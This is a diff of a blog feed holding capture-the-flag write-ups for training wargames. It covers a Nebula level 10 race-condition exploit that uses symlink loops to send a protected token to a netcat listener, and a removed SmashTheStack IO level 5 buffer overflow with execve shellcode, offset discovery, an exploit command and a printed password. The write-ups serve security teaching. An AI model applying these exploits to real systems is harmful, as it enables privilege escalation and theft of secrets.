+</pre></td><td class='code'><pre><code class=''><span class='line'>level09@nebula:/home/flag09$ ./flag09 /tmp/useme getflag
+</span><span class='line'>You have successfully executed getflag on a target account
+</span><span class='line'>PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pff, this was a difficult level, but really interesting and I learned something!</p>
+
+<h3>Level 10</h3>
+
+<p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p>
+
+<p>To do this level, log in as the level10 account with the password level10 . Files for this level can be found in /home/flag10.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span><span class='line'> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'> <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'> <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span><span class='line'> <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'> <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="cp">#undef HITHERE</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span><span class='line'>   <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
+</span><span class='line'> <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the home directory there is also a token file which we probably want to read. Since the briefing already hints at the system call we need to exploit, let&rsquo;s read the <em>access()</em> manpage:</p>
+
+<ul>
+<li><em>int access(const char </em>pathname, int mode);*</li>
+</ul>
+
+
+<blockquote><p>access() checks whether the calling process can access the file <em>pathname</em>.  If <em>pathname</em> is a symbolic link, it is dereferenced.</p>
+
+<p> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using <em>open(2)</em> creates a
+security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this
+reason, the use of this system call should be avoided.</p></blockquote>
+
+<p>The type of vulnerability in this code is a time-of-check, time-of-use (TOCTOU) race condition. You can read more about it on <a href="https://cwe.mitre.org/data/definitions/367.html">mitre.org</a>. To summarize, the program checks the property of a file (in this case it checks if the user is allowed to read the file), and then performs an operation on it (reading, writing, etc.). But the file that is checked is referenced by its name, and not its file descriptor, meaning that the program is vulnerable in the interval between the call to <em>access()</em> and the call to <em>open()</em>, since the file that was passed to <em>access()</em> might not be the same as the one which <em>open()</em> will operate on.</p>
+
+<p>First of all I wanted to test that the program will upload a file without problems, so I had netcat listen on my machine and created a file on the nebula system and tried to send it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ ./flag10 /tmp/tok 192.168.80.130
+</span><span class='line'>Connecting to 192.168.80.130:18211 .. Connected!
+</span><span class='line'>Sending file .. wrote file!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on my netcat side:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nc: connect to 192.168.80.130 18211 from 192.168.80.133 60491
+</span><span class='line'>.oO Oo.
+</span><span class='line'>blabla</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it worked just fine. The binary sent a banner and then the contents of the file. Now it&rsquo;s a matter of how to fool it into sending the token which we don&rsquo;t have permission to read. Well, what if the <em>access()</em> gives the ok to a file that I made, but when <em>open()</em> will try to read it, instead it will be a symbolic link to the token? After some trial and error, here&rsquo;s the solution that worked:</p>
+
+<ul>
+<li>first, on my host machine, I ran netcat in an infinite loop so that it will keep listening even when the other side closes the connection:</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# while true; do nc -nlp 18211; done</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>on the Nebula machine, I ran this command:</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do touch /tmp/tok & ./flag10 /tmp/tok 192.168.80.130 & ln -fs /home/flag10/token /tmp/tok & rm -f /tmp/tok; done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is another infinite loop that runs a series of commands in the background. A file named <em>tok</em> is created in <em>/tmp/</em>, the flag10 binary attempts to send this file to my host, but there is also a symlink command that links <em>tok</em> to the token, and this might happen before or after the <em>access()</em> call. And finally, the <em>tok</em> file is removed. In the netcat window, you will see the output flying by, and besides the banner, you can see the token contents: <code>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</code>, when the timing is right.</p>
+
+<p>Note that these commands aren&rsquo;t chained, but they run independent of each other (forked and run asynchronously in a separate sub-shell). You can read more here about the <a href="http://bashitout.com/2013/05/18/Ampersands-on-the-command-line.html">use of &amp; on the command line</a></p>
+
+<p>There is another alternative way I completed it, by following the example of the race condition attacks on <a href="https://iseclab.org/secprog/slides/secprog-6.pdf">pages 16-19</a> (there are nice diagrams helping with the explanation). Again, with netcat listening and 2 terminals on the Nebula machine, in one I run:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/tmp$ while true; do touch dummy; ln -sf dummy tok; rm -f tok; ln -sf /home/flag10/token tok; done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And in the other:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/tok 192.168.80.130; done</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When <em>tok</em> is passed to <em>access()</em>, everything is fine, but before the <em>open()</em> call, <em>tok</em> has been replaced with a symlink to the token, which <em>open()</em> happily reads.</p>
+
+<p>To finish, I used the token to SSH in as the flag10 user and run <em>getflag</em>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flag10@nebula:~$ getflag
+</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
+</span><span class='line'>/ Better hope the life-inspector doesn't  \
+</span><span class='line'>| come around while you have your life in |
+</span><span class='line'>\ such a mess.                            /
+</span><span class='line'> -----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[OverTheWire: Natas]]></title>
@@ -19597,273 +20921,6 @@ which makes is easy for the user to know what are the things his system has.</p>
 <p>Due to its features and convenience, pip is my favorite package installer. Of course, there are more advanced features in Python packaging, but I hope this introduction was helpful for getting to install and manage your packages.</p>
 
 <blockquote><p>You will stop at nothing to reach your objective, but only because your brakes are defective.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
-    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
-    <updated>2014-07-18T13:08:18-04:00</updated>
-    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
-    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>
-
-<!-- more -->
-
-
-<p>Code for level05.c:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span> 
-</span><span class='line'>
-</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>
-
-<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
-</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
-</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span><span class='line'>        <span class="p">}</span>
-</span><span class='line'>        <span class="n">ptr</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="cm">/* Get env var location. */</span>
-</span><span class='line'>        <span class="n">ptr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">-</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span> <span class="cm">/* Adjust for program name. */</span>
-</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s will be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">ptr</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
-</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Run the program in GDB with the pattern and then get the offset:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>0x37654136 in ?? ()
-</span><span class='line'>
-</span><span class='line'>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
-</span><span class='line'>[*] Exact match at offset 140</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now get the address of our environment variable:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
-</span><span class='line'>PWN will be at 0xbfffff53</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Profit:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
-</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
-</span><span class='line'>sh-4.2$ whoami
-</span><span class='line'>level6
-</span><span class='line'>sh-4.2$ cat /home/level6/.pass
-</span><span class='line'>9BT8fmYDTPimXXhY3m</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//don&#39;t get trapped, there&#39;s no need</span>
-</span><span class='line'><span class="c1">//level by bla</span>
-</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
